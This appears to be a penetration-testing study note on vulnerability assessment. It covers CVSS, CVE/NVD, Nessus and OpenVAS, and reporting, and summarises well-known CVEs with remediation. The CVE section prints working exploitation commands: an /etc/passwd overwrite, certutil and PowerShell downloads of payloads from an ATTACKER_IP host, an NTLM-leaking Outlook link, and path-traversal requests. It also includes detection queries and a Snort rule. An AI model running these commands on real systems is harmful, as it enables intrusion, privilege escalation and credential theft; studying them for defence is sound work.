---
title: "Vulnerability Assessment"
type: technique
tags: [cloud, cve, enumeration, git-poc, htb, linux, network, recon, web, windows]
phase: enumeration
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-vuln-assessment, git-raptor]
ate_updated: 2026-05-08
---

## What It Is

A **vulnerability assessment (VA)** is a systematic process of identifying, quantifying, and prioritizing weaknesses in an organization's environment — including applications, networks, operating systems, and infrastructure — without necessarily exploiting them. The output is a risk-ranked list of findings with remediation guidance.

**VA vs Penetration Testing:**

| | Vulnerability Assessment | Penetration Test |
|---|---|---|
| Goal | Identify and rank weaknesses | Simulate a real attacker; chain exploits to reach objectives |
| Exploitation | Generally none (or minimal, to confirm) | Active exploitation, lateral movement, post-exploitation |
| Scope | Broad; all assets in scope | Targeted; specific systems or attack paths |
| Output | Vulnerability list with CVSS scores | Narrative of attack path, business impact, evidence |
| Frequency | Continuous / quarterly | Periodic (annually or after major changes) |
| Compliance driver | PCI DSS, ISO 27001, HIPAA, FISMA | Often complementary to VA |

VAs are a required component of many compliance frameworks (PCI DSS mandates quarterly external and internal scans; ISO 27001 requires periodic scans; FISMA requires documented vulnerability management programs). Compliance scanning should not be the sole driver of a VA program — the organization's actual risk appetite and environment uniqueness must also be considered.

**Core concepts:**

- **Vulnerability:** A weakness or bug that opens the possibility of exploitation. Scored via CVSS and tracked in CVE/NVD.
- **Threat:** A process or actor that could exploit a vulnerability. Higher reward + easier exploitation = higher threat.
- **Exploit:** Code or resources that take advantage of a weakness (sources: Exploit-DB, Rapid7 DB, GitHub).
- **Risk:** The potential for damage when a threat exploits a vulnerability. Measured as the intersection of likelihood and impact.

Risk is often visualized as a matrix: high likelihood + high impact = highest risk (5); low likelihood + low impact = lowest risk (1).

---

## CVSS Scoring

The **Common Vulnerability Scoring System (CVSS)** is the industry standard for calculating vulnerability severity. Scores range from 0.0 to 10.0 and map to qualitative ratings:

| Score Range | Rating |
|-------------|--------|
| 0.0 | None |
| 0.1 – 3.9 | Low |
| 4.0 – 6.9 | Medium |
| 7.0 – 8.9 | High |
| 9.0 – 10.0 | Critical |

### Base Metric Group

The base score captures the intrinsic characteristics of the vulnerability, independent of time or environment.

**Exploitability Metrics:**

| Metric | Description | Values |
|--------|-------------|--------|
| Attack Vector (AV) | How the vulnerability is exploited | Network (N), Adjacent (A), Local (L), Physical (P) |
| Attack Complexity (AC) | Conditions beyond the attacker's control | Low (L), High (H) |
| Privileges Required (PR) | Level of privileges the attacker must have before exploiting | None (N), Low (L), High (H) |
| User Interaction (UI) | Whether a victim user must take action | None (N), Required (R) |

**Scope (S):** Whether a successful exploit can affect resources beyond the vulnerable component. Changed (C) or Unchanged (U).

**Impact Metrics (CIA Triad):**

| Metric | High | Low |
|--------|------|-----|
| Confidentiality (C) | All data exposed (e.g., passwords, keys) | Limited data exposed |
| Integrity (I) | Attacker can modify any data | Attacker has limited write control |
| Availability (A) | Complete denial of service | Partial disruption only |

### Temporal Metric Group

Adjusts the base score based on current exploit availability and patch status:

- **Exploit Code Maturity:** Unproven → Proof-of-Concept → Functional → High
- **Remediation Level:** Official Fix → Temporary Fix → Workaround → Unavailable
- **Report Confidence:** Unknown → Reasonable → Confirmed

### Environmental Metric Group

Allows an organization to adjust scores to reflect their specific environment and the importance they place on Confidentiality, Integrity, and Availability. Modified Base Metrics can be set to Low / Medium / High / Not Defined.

**Microsoft DREAD** (alternative model used alongside CVSS): rates vulnerabilities across five factors — Damage Potential, Reproducibility, Exploitability, Affected Users, Discoverability — each scored 1–10.

**Using the calculator:** `https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator`

---

## Exploit Feasibility Verdicts

CVSS scores rate *severity*; feasibility verdicts rate *exploitability given specific binary/env constraints*. Always run feasibility analysis for memory corruption findings before investing in PoC development.

| Verdict | Meaning | Typical scenario |
|---------|---------|-----------------|
| **Exploitable** | Clear path to code execution; primitives viable | Controlled RIP, no blocking mitigations |
| **Difficult (Constrained)** | Primitives exist but hard to chain | Full RELRO + glibc 2.34+ (no hooks); need info leak first |
| **Unlikely (Blocked)** | No known viable path with current constraints | %n blocked + Full RELRO + safe linking |
| **Not Applicable** | Web vuln; binary mitigations don't apply | SQLi, XSS, SSRF |

**Two-axis model:** `verdict` (can you trigger it?) is separate from `impact` (what happens?). A null pointer dereference can be verdict=Exploitable with impact=DoS — the bug is real and reliably triggerable, but only crashes the process.

**Enabling vulnerabilities** — include in findings even when low standalone impact:
- Info leak → leaks ASLR/PIE base → turns Unlikely into Exploitable
- Format string read → leaks stack canary → unblocks return address overwrite
- UAF read → leaks heap layout → enables safe-linking bypass

**Consequence-driven analysis for memory corruption:**
- Attacker controls write destination + value → Code execution (Critical)
- Attacker controls write value, fixed destination → Data corruption (High)
- Attacker controls pointer used in function call → Code execution (Critical)
- Attacker causes out-of-bounds read → Info leak (Medium–High)
- Attacker causes NULL deref → DoS (Low–Medium)

---

## CVE and NVD

### CVE (Common Vulnerabilities and Exposures)

CVE is a publicly available catalog of security issues sponsored by the U.S. Department of Homeland Security and maintained by MITRE. Each entry has a unique CVE ID (format: `CVE-YEAR-NNNNN`), a description, and references.

**Requirements for CVE assignment:**
- The issue must be independently fixable
- It must affect one codebase
- It must be acknowledged and documented by the relevant vendor

**Process for obtaining a CVE ID:**
1. Verify the issue is a genuine vulnerability not already tracked
2. Contact the affected product vendor in good faith
3. If the vendor is a CNA (CVE Numbering Authority), request the ID from them; otherwise use a third-party coordinator
4. Submit via `cveform.mitre.org` if other paths fail
5. Receive confirmation, then receive the CVE ID (private until disclosure)
6. Coordinate public disclosure to avoid enabling attackers before patches are available
7. Provide additional detail to the CVE Team for the official listing

**Responsible disclosure:** sharing vulnerability details with the vendor before public release. Failing to do so may allow threat actors to weaponize the issue as a zero-day.

### NVD (National Vulnerability Database)

The NVD (`nvd.nist.gov`) enriches CVE entries with CVSS scores, CWE classification, CPE (affected product identifiers), and references. It is the primary reference for looking up severity scores during assessments.

**Looking up a CVE:**
```
https://nvd.nist.gov/vuln/detail/CVE-YYYY-NNNNN
```

**OVAL (Open Vulnerability Assessment Language):** an XML-based standard used by scanners (including Nessus) to define what to check on a system. OVAL definitions describe vulnerable states, compliance requirements, installed software, and patch status without requiring active exploitation.

---

## Tools

### Nessus

Nessus (by Tenable) is one of the most widely used commercial vulnerability scanners. The free **Nessus Essentials** tier allows scanning up to 16 IPs. Plugins are written in NASL (Nessus Attack Scripting Language); at the time of writing Tenable has published over 145,000 plugins covering more than 58,000 CVE IDs.

**Setup:**

```bash
# Install on Debian/Ubuntu
dpkg -i Nessus-<version>-ubuntu910_amd64.deb

# Start the service
sudo systemctl start nessusd.service
```

Access the UI at `https://localhost:8834`. Select **Nessus Essentials** and enter the activation code obtained from `tenable.com/products/nessus/activation-code`.

**Scan setup:**
1. Create a new scan from the UI — select a scan template (Basic Network Scan, Advanced Scan, etc.)
2. Enter target IP ranges
3. Configure credentials for authenticated scanning (yields far more findings)
4. Launch and wait for completion

**Interpreting findings:** Plugins are rated Critical / High / Medium / Low / Info. Click a finding to see the plugin's description, solution, and CVE references. The Plugins tab provides mitigation detail. Mark findings as false positives only after manual verification.

**Exporting scans:** Nessus exports to `.nessus` (XML), `.db`, HTML, PDF, or CSV.

```bash
# Download reports via CLI using nessus-report-downloader
./nessus_downloader.rb
# Enter server IP (127.0.0.1), port (8834), username, password
# Select scan ID and output format (CSV recommended for parsing)
```

**Network impact awareness:** A Nessus scan against a single host can generate ~230 kbit/s receive and ~300 kbit/s transmit. Monitor with `vnstat -l -i eth0` before and during scans. On low-bandwidth or congested links, tune scan concurrency settings.

### OpenVAS (GVM)

OpenVAS is the open-source vulnerability scanner component of Greenbone's Vulnerability Manager (GVM). It supports authenticated and unauthenticated scanning and uses NVT (Network Vulnerability Test) families.

**Installation:**

```bash
sudo apt-get update && apt-get -y full-upgrade
sudo apt-get install gvm

# Run setup (takes up to 30 minutes — downloads NVT feeds)
gvm-setup

# Start GVM services
gvm-start
```

Access the Greenbone Security Assistant (GSA) web UI at `https://127.0.0.1:9392`.

**Scan configurations (recommended only):**

| Config | What it does |
|--------|-------------|
| Base | Enumerates host status and OS info only; no vulnerability checks |
| Discovery | Enumerates services, ports, hardware, and software; no vuln checks |
| Host Discovery | Ping-based alive detection only |
| System Discovery | More detailed OS and hardware enumeration than Discovery |
| Full and fast | Recommended; uses intelligence to select appropriate NVT checks for each host |

**Setting up a scan:**
1. Navigate to Configurations > Targets; add target (IP, port list, alive test method)
2. For authenticated scans, add credentials (high-privilege user — `root` or `Administrator`)
3. Navigate to Scans > Tasks; click the wizard icon to create a new task
4. Select target, scan config, and schedule; save and start

**Authenticated vs. unauthenticated:** Credentialed scans (using root/Administrator) return significantly more findings because the scanner can examine installed packages, registry keys, and configuration files directly.

**Exporting results:** Reports are accessible from the Scans page. Export formats: XML, CSV, PDF, ITG, TXT.

```bash
# Convert XML report to Excel using openvasreporting
python3 -m openvasreporting -i report-<id>.xml -f xlsx
```

---

## VA Methodology

1. **Scoping** — define the target IP ranges, excluded systems, testing window, and authorized credentials. Document everything in a scoping agreement.
2. **Asset inventory** — identify all data assets: on-premises servers, workstations, network devices, cloud resources, SaaS applications, and storage media. Assets that are not inventoried cannot be protected or scanned.
3. **Scanning** — run unauthenticated scans to identify externally visible issues, then authenticated scans for a full internal view. Use Nessus or OpenVAS. Monitor network impact.
4. **Validation** — manually verify high/critical findings to eliminate false positives before reporting. A false positive in a report wastes client remediation effort and damages credibility.
5. **Risk prioritization** — rank findings using CVSS base scores adjusted for environmental factors. Consider exploit availability (Temporal metrics) and asset criticality.
6. **Reporting** — produce a client-ready report covering executive summary, methodology, findings with evidence, and remediation recommendations.

---

## Reporting

The report is the final deliverable and the most visible artifact of the assessment. It must be readable by both technical staff and non-technical executives.

### Executive Summary

A high-level overview intended for management. Include:
- Total vulnerability count broken down by severity (Critical / High / Medium / Low)
- Overall risk posture and most critical findings to address immediately
- A graphical severity breakdown (bar chart or pie chart)

No technical jargon; focus on business risk and remediation priority.

### Overview of Assessment

- Methodology used (e.g., unauthenticated + authenticated scanning with Nessus/OpenVAS)
- Tools used
- Testing period and approach
- Reference to compliance frameworks if applicable (PCI DSS, ISO 27001, etc.)

### Scope and Duration

- All IP ranges, hostnames, and systems included in the assessment
- Explicit list of exclusions
- Start and end dates of testing

### Vulnerabilities and Recommendations

The technical body of the report. Group related findings by type or severity. Each finding should include:

| Field | Content |
|-------|---------|
| Vulnerability Name | Descriptive title |
| CVE | CVE ID(s) if applicable |
| CVSS Score | Base score and vector string |
| Description | What the vulnerability is and why it matters |
| References | NVD link, vendor advisory, CWE |
| Remediation Steps | Specific, actionable patch/configuration guidance |
| Proof of Concept | Screenshot or command output confirming the finding |
| Affected Systems | IP addresses / hostnames |

After eliminating false positives, group findings that relate to the same root cause or category (e.g., all systems missing a specific patch family).

**Reporting standards:**
- PTES (Penetration Testing Execution Standard) — defines report structure phases
- NIST Cybersecurity Framework — used for incident response policy design
- OWASP WSTG — reference for web application findings classification

---

## Notable CVEs

A summary of notable real-world CVEs studied in associated THM CVE rooms, relevant for both exploitation techniques and VA reporting context.

### CVE-2022-26134 — Confluence OGNL RCE

**Affected:** Atlassian Confluence Server and Data Center, versions 1.3.0 through 7.18.1 (multiple version ranges)
**CVSS:** 9.8 (Critical)
**Type:** Unauthenticated Remote Code Execution
**Disclosed:** May 2022 (identified by Volexity as an actively exploited zero-day)

An OGNL (Object-Graph Navigation Language) injection vulnerability in Confluence's HTTP request handling. Attackers could send a crafted HTTP request to execute arbitrary commands on the server without any authentication. Exploitation was trivial and a PoC was quickly available. Widely exploited in the wild before patches were applied.

**Remediation:** Upgrade to a patched version. Atlassian published advisories with specific fixed versions for each affected branch. If immediate upgrade was not possible, blocking external network access to Confluence was recommended as a temporary mitigation.

### CVE-2022-22965 — Spring4Shell RCE

**Affected:** Spring Framework Core, versions before 5.2.20 and 5.3.18; requires JDK 9+, Apache Tomcat deployment as a WAR, and `spring-webmvc` / `spring-webflux` dependency
**CVSS:** 9.8 (Critical)
**Type:** Remote Code Execution (webshell upload)
**Disclosed:** March 2022

A bypass of the older CVE-2010-1622 patch. Spring MVC automatically binds HTTP request parameters to Java object properties. By crafting parameters targeting the `ClassLoader`, attackers could manipulate Tomcat's logging configuration to write a JSP webshell to a web-accessible directory, achieving RCE. The conditions for exploitation are relatively specific (JDK 9+, Tomcat WAR deployment), which limited overall impact compared to Log4Shell.

**Exploitation:**
```bash
python3 exploit.py http://TARGET/
# Webshell uploaded to: http://TARGET/tomcatwar.jsp?pwd=thm&cmd=whoami
```

**Remediation:** Upgrade to Spring Framework 5.3.18+ or 5.2.20+.

### CVE-2022-0847 — Dirty Pipe (Linux LPE)

**Affected:** Linux kernel 5.8 through 5.16.10 / 5.15.24 / 5.10.101
**CVSS:** 7.8 (High)
**Type:** Local Privilege Escalation (arbitrary file overwrite)
**Disclosed:** February 2022 by Max Kellermann (cm4all)

A vulnerability in the Linux kernel's pipe implementation. The `PIPE_BUF_FLAG_CAN_MERGE` flag, introduced in kernel 5.8, combined with a pre-existing bug allowing arbitrary pipe flags, and the `splice()` system call (which links pipe buffers directly to page cache), allowed a local user with read access to any file to overwrite that file's contents — bypassing normal write permissions, SUID protection, and even read-only filesystems.

**Impact:** Any file readable by the attacker can be written to. Classic technique: overwrite `/etc/passwd` with a root-equivalent entry using a known password hash.

```bash
# Find offset of target account in /etc/passwd
grep -b "games" /etc/passwd
# Compile and run PoC
gcc poc.c -o exploit
./exploit /etc/passwd 189 'hacker:HASH:0:0::/root:/bin/bash\n'
su hacker  # use the known password
```

An alternative exploit (dirtypipez by bl4sty) overwrites SUID binaries directly (the SUID bit is preserved due to the vulnerability), injecting shellcode that spawns a root shell.

**Remediation:** Update to kernel 5.16.11, 5.15.25, or 5.10.102.

### CVE-2021-3156 — Baron Samedit (sudo Heap Overflow)

**Affected:** sudo versions prior to 1.9.5p2; present in most Linux distributions
**CVSS:** 7.8 (High)
**Type:** Local Privilege Escalation (heap-based buffer overflow)
**Disclosed:** January 2021 by Qualys

A heap-based buffer overflow in sudo's command-line argument parsing when using `sudoedit`. When sudo parses a backslash-terminated argument, the `set_cmnd()` function writes past the end of a heap buffer. An attacker with a local account (no sudo privileges needed) can exploit this to obtain a root shell.

**Vulnerability check:**
```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# If the process crashes (Segmentation fault / core dump), the system is vulnerable
```

**Remediation:** Upgrade sudo to 1.9.5p2 or later via the distribution's package manager.

### CVE-2023-38408 — OpenSSH ssh-agent Forwarding RCE

**Affected:** OpenSSH before 9.3p2
**CVSS:** 9.8 (Critical)
**Type:** Remote Code Execution via agent forwarding
**Disclosed:** July 2023

The PKCS#11 provider loading mechanism in `ssh-agent` uses an insufficiently trustworthy shared library search path (`/usr/lib`). When a user forwards their SSH agent to an attacker-controlled server, the attacker can instruct the agent to load a malicious PKCS#11 provider from the client's filesystem, executing arbitrary code with the privileges of the user running `ssh-agent`.

**Attack flow:**
1. Attacker and victim (Alice) both have SSH access to a server
2. Alice uses SSH agent forwarding (`ssh -A`)
3. Attacker obtains the agent socket path (`/tmp/ssh-*/agent.*`), exports it, then uses `ssh-add -s <library>` to load malicious shared libraries
4. Shellcode injected via the agent socket triggers a SIGSEGV handler, redirecting execution to attacker-controlled code
5. Attacker connects to the reverse shell spawned under Alice's credentials

**Remediation:** Upgrade OpenSSH to 9.3p2 or later. Disable SSH agent forwarding (`ForwardAgent no`) unless strictly required.

### CVE-2023-27350 — PaperCut Auth Bypass + RCE

**Affected:** PaperCut NG and MF (all versions before 22.1.3 on Windows/Linux/Mac)
**CVSS:** 9.8 (Critical)
**Type:** Unauthenticated Authentication Bypass leading to Remote Code Execution
**Disclosed:** April 2023; actively exploited including by Cl0p ransomware group

A two-stage vulnerability. First, an installation-flow URL (`/app?service=page/SetupCompleted`) was not removed after setup and could be accessed by unauthenticated users. Navigating to it and clicking "Login" triggers `performLogin()` with Admin privileges via a Session Puzzling flaw, granting an admin session token.

Second, the admin console's Script Manager for printers accepts arbitrary JavaScript that can call Java runtime APIs. Disabling sandboxing allows OS command execution:

```javascript
java.lang.Runtime.getRuntime().exec('cmd.exe /C whoami');
```

Since PaperCut runs as `NT AUTHORITY\SYSTEM` on Windows (or `root` on Linux), the RCE is immediately privileged — no escalation needed.

**Automated exploitation:**
```bash
# Auth bypass + command execution
python3 CVE-2023-27350.py -u http://TARGET:9191 -c "certutil.exe -urlcache -f http://ATTACKER:8080/shell.exe shell.exe"
python3 CVE-2023-27350.py -u http://TARGET:9191 -c "cmd.exe /c shell.exe"
```

**Remediation:** Upgrade to PaperCut NG/MF 22.1.3 or later.

### CVE-2024-21413 — Outlook MonikerLink NTLM Leak

**Affected:** Microsoft Outlook (multiple versions before February 2024 Patch Tuesday updates)
**CVSS:** 9.8 (Critical)
**Type:** NTLM credential leak (netNTLMv2 hash capture); RCE via COM possible but no public PoC
**Disclosed:** February 2024

Outlook renders HTML emails and processes Moniker Links (Windows COM URL types). Normally, opening a `file://` link from an email triggers Outlook's Protected View warning. However, appending `!` followed by arbitrary text to the URL path causes Protected View to be bypassed:

```html
<a href="file://ATTACKER_IP/test!exploit">Click me</a>
```

When the victim clicks the link, Outlook initiates an SMB connection to the attacker's IP using the victim's current Windows credentials, sending the netNTLMv2 hash. The attacker captures it with Responder and can crack it offline or relay it.

**Attack flow:**
```bash
# Start Responder to capture hashes
responder -I tun0

# Send the malicious email via Python script
python3 exploit.py  # Sets attacker email, crafts HTML with Moniker Link, sends via SMTP
```

**Detection:** YARA rule by Florian Roth detects the `file:///\\` pattern in email files. SMB authentication attempts visible in Wireshark packet captures.

**Remediation:** Apply the February 2024 Microsoft security updates. As an interim measure, block outbound SMB (TCP 445) at the perimeter to prevent hash exfiltration.

### CVE-2021-3493 — OverlayFS Privilege Escalation (Ubuntu)

**Affected:** Ubuntu 14.04, 16.04, 18.04, 20.04, and 20.10 with default kernel configurations; `overlayfs` kernel module enabled by default on Ubuntu Server 18.04+
**CVSS:** 7.8 (High)
**Type:** Local Privilege Escalation (kernel module abuse)
**Disclosed:** April 2021 (PoC by SSD-Disclosure)

The Linux OverlayFS (overlay filesystem) kernel module allows unprivileged user namespaces. In the vulnerable Ubuntu kernel builds, a user can mount an overlayfs filesystem inside a user namespace and then call `xattr` operations on the upper-layer files. The kernel incorrectly allows `setxattr` operations that would normally require `CAP_SYS_ADMIN`, because the capability check is performed in the namespace context rather than the initial user namespace. This allows setting security extended attributes (e.g., `security.capability`) on files, which the kernel then honours in the real filesystem context — enabling an attacker to grant any file elevated capabilities, leading to immediate root access.

The vulnerability is particularly impactful because OverlayFS is installed and enabled by default on Ubuntu Server 18.04, and the exploit requires no special prerequisites: any local user who can run a binary can become root. If a C compiler is not available on the target, the exploit binary can be compiled statically on another machine and transferred.

**Exploitation:**

```bash
# Download PoC source (SSD-Disclosure)
# https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/
# Save as overlayfs.c

# Compile the exploit
gcc -o exploit overlayfs.c

# Run — privilege escalation to root is near-instant
./exploit
```

**Remediation:** Apply Ubuntu kernel security updates released in April 2021. The fix restricts `setxattr` operations within user namespaces. Alternatively, disable unprivileged user namespaces: `sysctl -w kernel.unprivileged_userns_clone=0` (where available).

### CVE-2019-18634 — sudo pwfeedback Heap Overflow

**Affected:** sudo versions earlier than 1.8.26; `pwfeedback` option enabled in `/etc/sudoers` (default on ElementaryOS and Linux Mint at time of disclosure)
**CVSS:** 7.8 (High)
**Type:** Local Privilege Escalation (heap-based buffer overflow)
**Disclosed:** January 2020; discovered by Joe Vennix (Apple Information Security)

The `pwfeedback` option in sudo causes a `*` asterisk to be printed to the terminal for each character typed as a password. When this option is enabled, a heap-based buffer overflow exists in the password input handling code: if an attacker pipes a very large input (including a null byte) into `sudo -S`, the data overflows the heap buffer allocated for the password, corrupting adjacent heap metadata. By crafting the overflow payload precisely, an attacker can overwrite a function pointer or heap control structure to redirect execution and obtain a root shell. No sudo privileges are required — the vulnerability is exploitable by any local user regardless of sudoers configuration.

**Confirm vulnerability (segfault = vulnerable):**

```bash
perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
# If output is "Segmentation fault", the system is vulnerable
```

**Exploitation (Saleem Rashid PoC):**

```bash
# Download the exploit source
wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c

# Compile
gcc -o exploit exploit.c

# Run to obtain root shell
./exploit
```

**Remediation:** Upgrade sudo to 1.8.26 or later. Disable `pwfeedback` in `/etc/sudoers` if the upgrade cannot be applied immediately: remove or comment out any `Defaults pwfeedback` line.

### CVE-2024-57727 — SimpleHelp Path Traversal (Unauthenticated)

**Affected:** SimpleHelp remote support software (Windows and Linux); versions prior to the January 2025 patch
**CVSS:** 7.5 (High)
**Type:** Unauthenticated Path Traversal — arbitrary file read
**Disclosed:** January 2025

SimpleHelp's HTTP server fails to properly sanitise path traversal sequences in requests to the `/toolbox-resource/` endpoint. By inserting `../` sequences into the URL, an unauthenticated attacker can read arbitrary files from the server filesystem, including the server configuration file `serverconfig.xml`, which contains sensitive information such as the server's licence key, configuration, and potentially credentials.

The exploit path differs slightly between Windows and Linux installs: on Windows the traversal works directly through `resource1`; on Linux a valid subdirectory name (e.g., `secmsg`) must be used as the intermediate directory reference.

**Exploitation — confirm vulnerability:**

```bash
git clone https://github.com/imjdl/CVE-2024-57727
cd CVE-2024-57727
python3 poc.py http://TARGET_IP
# [+] http://TARGET_IP is vulnerable
```

**Manual exploitation — Windows target:**

```bash
curl --path-as-is \
  "http://TARGET_IP/toolbox-resource/../resource1/../../configuration/serverconfig.xml"
```

**Manual exploitation — Linux target (requires a valid directory name):**

```bash
# 'secmsg' is a valid SimpleHelp subdirectory; other valid names include:
# alertsdb, backups, branding, history, recordings, remotework, etc.
curl --path-as-is \
  "http://TARGET_IP/toolbox-resource/../secmsg/../../configuration/serverconfig.xml"
```

The `--path-as-is` flag prevents curl from normalising (stripping) the `../` sequences before sending the request.

**Detection — web server logs:**

```bash
# Grep for path traversal patterns in Nginx/Apache logs
grep -E "(\.\./|\%2e\%2e|%252e%252e)" /var/log/nginx/access.log

# ELK KQL query
# http.request.uri.path: (*../* or *%2e%2e* or *%252e%252e*)

# Splunk query
# index=web_logs ("..%2f" OR "../" OR "%2e%2e%2f")
```

**Snort IDS rule:**

```bash
alert tcp any any -> any 80 (msg:"SimpleHelp CVE-2024-57727 Path Traversal Attempt"; \
flow:to_server,established; content:"GET"; http_method; \
content:"/html/.."; http_uri; pcre:"/(\.\.\/|%2e%2e\/|%252e%252e\/)/i"; \
classtype:web-application-attack; sid:10045727; rev:1;)
```

**Remediation:** Upgrade SimpleHelp to the January 2025 patched release. Apply web application firewall rules to block `../` and URL-encoded traversal sequences at the perimeter.

### CVE-2017-0213 — Windows COM Elevation of Privilege

**Affected:** Windows Vista, 7, 8.1, 10; Windows Server 2008 through 2016 (including build 14393 / Server 2016); patched in May 2017 Patch Tuesday
**CVSS:** 7.0 (High)
**Type:** Local Privilege Escalation (COM object elevation)
**Disclosed:** May 2017 (Microsoft Security Bulletin MS17-014 / ADV170012)

A flaw in the Windows COM (Component Object Model) infrastructure allows a low-privileged local user to instantiate certain COM objects in a way that results in elevated privileges. The exploit targets the COM Aggregate Marshaller and takes advantage of the fact that certain out-of-process COM servers can be coerced into running with higher privileges than the calling process. The exploit does not require any specific user privileges — a standard user account is sufficient. It is particularly useful after obtaining an initial foothold (e.g., via a web shell) because the initial shell context may be a low-privilege IIS application pool identity or a standard domain user.

In the THM Retro CTF, the attack chain was: WordPress site enumeration (WPScan) → credential discovery in a blog post comment (`wade:parzival`) → initial shell via PHP reverse shell injected into a WordPress theme's 404.php → `systeminfo` confirms Windows Server 2016 build 14393 → exploit download and execution → SYSTEM shell.

**Attack chain:**

```bash
# 1. Confirm Windows version is vulnerable (build 14393 = Server 2016 RTM, unpatched)
systeminfo | findstr "OS Version"

# 2. On attacker machine: download pre-compiled exploit
git clone https://github.com/WindowsExploits/Exploits
# Navigate to CVE-2017-0213 directory for the compiled .exe

# 3. Host the exploit binary
python3 -m http.server 8080

# 4. On the target (low-privilege shell): download the exploit
powershell -c "(New-Object System.Net.WebClient).Downloadfile('http://ATTACKER_IP:8080/CVE-2017-0213.exe','exploit.exe')"

# 5. Execute to obtain SYSTEM shell
.\exploit.exe
```

**Note:** The exploit binary is available pre-compiled at `github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213`. Source can be compiled with Visual Studio or MinGW.

**Remediation:** Apply the May 2017 Microsoft security updates (MS17-014). Ensure Windows Update is current; build 14393 (Server 2016 RTM) without subsequent patches is vulnerable. Restrict outbound HTTP from low-privilege accounts to prevent payload download.

---

## Hidden Parameters Discovery

Web applications often contain hidden or undocumented parameters (API fields, debug modes, legacy inputs) not exposed in the UI. Discovering these is crucial for comprehensive vulnerability assessments.

**Tools:**
*   **Arjun**: `arjun -u "https://example.com/"`
*   **x8**: `x8 -u "https://example.com/" -w <wordlist>`
*   **ParamSpider**: Mines URLs from Web Archives for historical parameters.

---

## Sources

- HTB/CPTS Module 108 — Vulnerability Assessments (Security Assessments, CVSS, CVE, Nessus, OpenVAS, Reporting)
- TryHackMe CVE rooms: Atlassian CVE-2022-26134, Spring4Shell CVE-2022-22965, Dirty Pipe CVE-2022-0847, Baron Samedit CVE-2021-3156, OpenSSH FW RCE CVE-2023-38408, PaperCut NG CVE-2023-27350, MonikerLink CVE-2024-21413
- NVD CVSS v3 Calculator: `nvd.nist.gov/vuln-metrics/cvss/v3-calculator`
- CVE database: `cve.mitre.org`
- FIRST CVSS specification: `first.org/cvss/`
- Tenable Nessus plugins database: `tenable.com/plugins`
- Greenbone OpenVAS documentation: `docs.greenbone.net`
